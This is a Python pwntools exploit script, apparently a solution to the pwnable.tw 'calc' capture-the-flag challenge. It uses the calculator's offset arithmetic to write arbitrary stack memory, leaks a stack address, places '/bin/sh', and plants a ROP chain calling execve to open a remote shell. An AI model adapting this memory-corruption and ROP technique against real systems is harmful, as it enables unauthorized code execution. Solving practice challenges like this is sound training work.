from pwn import *


ropStartOff = 361
ebpValue = 368
stringOff = 380
stringDiff = (stringOff - ebpValue) * 4

def wmem(con, offset, data):
    con.sendline('%+d' % (offset))
    currVal = int(con.recvline())
    diff = data - currVal
    con.sendline('%+d%+d' % (offset, diff))

    return con.recvline()


def pebp(con):
    con.sendline('+360')
    recv = con.recvline()
    baseAdd = int(recv)
    print("Base address is:"+str(hex(baseAdd)))
    return baseAdd


def injectingArr(con, startOffset, arr):
    p = startOffset
    for part in arr:
        print('Inserting value: 0x%x into offset: %+d' % (part, p))
        print('Current value is: ' + str(hex(int(wmem(conn, p, part)))))
        p += 1


# Open Connection
#conn = process('./calc')
conn = remote('chall.pwnable.tw',10100)
print(conn.recvline())


reqStack = [0x080701aa, 0x0, 0x080701d1, 0x0, 0xdeadbeef, 0x0805c34b, 0xb, 0x08049a21]
strings = [0x6e69622f, 0x68732f]


# Injecting the string address
injectingArr(conn, stringOff, strings)


# Correcting the reqStart
nebp = pebp(conn) + stringDiff
print("Corrected string address: 0x%x" % (nebp))
reqStack[4] = nebp


# Injecting the rop itself
injectingArr(conn, ropStartOff, reqStack)


conn.sendline('')
conn.interactive()
